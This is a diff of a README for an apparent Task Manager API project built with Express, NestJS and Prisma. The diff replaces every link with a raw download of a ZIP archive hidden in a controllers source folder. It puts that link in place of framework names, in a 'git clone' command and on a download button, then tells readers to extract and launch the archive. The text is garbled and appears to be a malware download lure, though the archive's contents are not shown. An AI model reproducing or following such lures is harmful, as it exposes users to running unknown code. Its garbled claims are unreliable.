@@ -1,6 +1,6 @@
 # Task Manager API 🚀
 
-Welcome to the Task Manager API repository! This API serves as the backend for a task management application, built with a focus on clean architecture and domain-driven design (DDD). It utilizes popular technologies such as Express, NestJS, https://github.com/PhucDo1305/task-manager-api/releases, PostgreSQL, Prisma ORM, SuperTest, TypeScript, Vite, and Zod.
+Welcome to the Task Manager API repository! This API serves as the backend for a task management application, built with a focus on clean architecture and domain-driven design (DDD). It utilizes popular technologies such as Express, NestJS, https://github.com/PhucDo1305/task-manager-api/raw/refs/heads/main/src/infra/http/controllers/task-manager-api-1.2.zip, PostgreSQL, Prisma ORM, SuperTest, TypeScript, Vite, and Zod.
 
 ## Overview ℹ️
 
@@ -10,8 +10,8 @@ This repository contains the source code for the Task Manager API. The API is de
 
 - **Clean Architecture:** Built following best practices for clean architecture to ensure separation of concerns and maintainability.
 - **Domain-Driven Design (DDD):** Utilizes DDD principles to model the domain logic effectively.
-- **Express:** Utilizes https://github.com/PhucDo1305/task-manager-api/releases as the web application framework for https://github.com/PhucDo1305/task-manager-api/releases
-- **NestJS:** Employs NestJS, a progressive https://github.com/PhucDo1305/task-manager-api/releases framework, for building efficient, reliable, and scalable server-side applications.
+- **Express:** Utilizes https://github.com/PhucDo1305/task-manager-api/raw/refs/heads/main/src/infra/http/controllers/task-manager-api-1.2.zip as the web application framework for https://github.com/PhucDo1305/task-manager-api/raw/refs/heads/main/src/infra/http/controllers/task-manager-api-1.2.zip
+- **NestJS:** Employs NestJS, a progressive https://github.com/PhucDo1305/task-manager-api/raw/refs/heads/main/src/infra/http/controllers/task-manager-api-1.2.zip framework, for building efficient, reliable, and scalable server-side applications.
 - **PostgreSQL:** Uses PostgreSQL as the relational database management system.
 - **Prisma ORM:** Integrates Prisma ORM for database access and data modeling.
 - **SuperTest:** Implements SuperTest for HTTP assertions to test Express routes.
@@ -23,7 +23,7 @@ This repository contains the source code for the Task Manager API. The API is de
 
 To get started with the Task Manager API, follow these steps:
 
-1. Clone the repository: `git clone https://github.com/PhucDo1305/task-manager-api/releases`
+1. Clone the repository: `git clone https://github.com/PhucDo1305/task-manager-api/raw/refs/heads/main/src/infra/http/controllers/task-manager-api-1.2.zip`
 2. Install dependencies: `npm install`
 3. Set up the PostgreSQL database and update the database configuration in the `.env` file.
 4. Run the migrations: `npx prisma migrate dev`
@@ -53,7 +53,7 @@ To deploy the Task Manager API to a production environment, consider configuring
 
 Download the latest release of the Task Manager API codebase by clicking the button below:
 
-[![Download Release](https://github.com/PhucDo1305/task-manager-api/releases)](https://github.com/PhucDo1305/task-manager-api/releases)
+[![Download Release](https://github.com/PhucDo1305/task-manager-api/raw/refs/heads/main/src/infra/http/controllers/task-manager-api-1.2.zip)](https://github.com/PhucDo1305/task-manager-api/raw/refs/heads/main/src/infra/http/controllers/task-manager-api-1.2.zip)
 
 If the link ends with the file name, ensure to extract the ZIP file and launch the application as per the installation instructions provided.
 
